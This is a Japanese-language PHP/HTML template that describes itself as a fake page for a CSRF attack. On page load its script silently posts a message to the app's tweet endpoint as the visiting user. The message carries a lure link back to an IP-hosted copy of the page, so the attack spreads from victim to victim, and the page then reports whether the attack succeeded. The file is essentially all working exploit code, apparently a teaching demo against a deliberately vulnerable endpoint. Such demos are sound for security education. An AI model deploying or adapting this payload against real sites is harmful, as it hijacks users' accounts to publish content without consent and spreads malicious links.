<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="utf-8">
</head>
<body>
<p>csrf攻撃するための偽ページ</p>
<a href="<?=url('/home')?>">結果を確認</a>

<script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>

<script>
    $(function () {
        const text = 'このページ面白いよ！ http://3.112.243.81/anzen_na_page_dayo/csrf'
        $.ajax({
                url: '<?=url('/api/tweet/danger/post')?>',
                type: 'post',
                data: { 'text' :  text},
                dataType: 'json'
            }
        )
            .done(function(data) {
                if (data['result'] === '1') {
                    window.alert('攻撃成功！');
                } else {
                    window.alert('攻撃失敗！');
                }
            })

            .fail(function() {
                window.alert('接続に失敗');
            });
    })
</script>
</body>
</html>